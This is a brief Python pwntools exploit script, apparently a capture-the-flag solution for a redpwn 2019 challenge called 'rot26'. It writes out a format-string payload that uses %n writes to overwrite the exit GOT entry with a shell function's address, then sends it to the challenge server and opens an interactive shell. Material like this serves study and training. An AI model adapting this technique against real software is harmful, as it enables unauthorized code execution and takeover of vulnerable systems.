#!/usr/bin/python2

from pwn import *

shell = 0x8048737
exitplt = 0x804a020

exploit = ''
exploit += p32(exitplt) #set first address to write to
exploit += p32(exitplt+2) #set second address to write to
exploit += '%34607x' #print enough character to reach shell[4:]
exploit += '%7$n' #write number of character printed in first address
exploit += '%32973x' #print enough character to reach shell[0:4]
exploit += '%8$n' #write number of character printed in first address

#r = process('./rot26')
r = remote('chall2.2019.redpwn.net', 4003)
r.sendline(exploit)
r.interactive()
